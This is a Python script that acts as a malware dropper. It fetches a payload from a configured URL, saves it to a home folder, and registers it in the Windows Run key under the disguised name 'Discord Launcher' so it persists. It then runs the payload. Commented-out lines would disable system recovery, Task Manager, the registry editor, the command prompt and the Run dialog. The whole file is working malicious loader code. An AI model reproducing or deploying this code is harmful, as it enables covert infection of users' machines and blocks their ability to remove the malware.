import os
from time import sleep
import requests
from modules.constants import MY_HOME, PAYLOAD_URL, PAYLOAD_NAME


def persistence(home, file_name):
    try:
    #     os.system('bcdedit /set {default} recoveryenabled No')
    #     os.system('bcdedit /set {default} bootstatuspolicy ignoreallfailures')
    #     os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableRegistryTools /d 1 /f')
    #     os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableTaskMgr /d 1 /f')
    #     os.system(
    #         'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableCMD /d 1 /f')
    #     os.system(
    #         'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRun /d 1 /f')
        os.system(
            f'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v "Discord Launcher" /d {home+file_name} /f')
    except:
        pass

try:
    r = requests.get(PAYLOAD_URL, allow_redirects=True)

    if os.path.exists(MY_HOME):
        open(MY_HOME + PAYLOAD_NAME, "wb").write(r.content)
    else:
        os.makedirs(MY_HOME)
        open(MY_HOME + PAYLOAD_NAME, "wb").write(r.content)
except:
    pass
persistence(MY_HOME, PAYLOAD_NAME)

sleep(30)

os.startfile(MY_HOME+PAYLOAD_NAME)
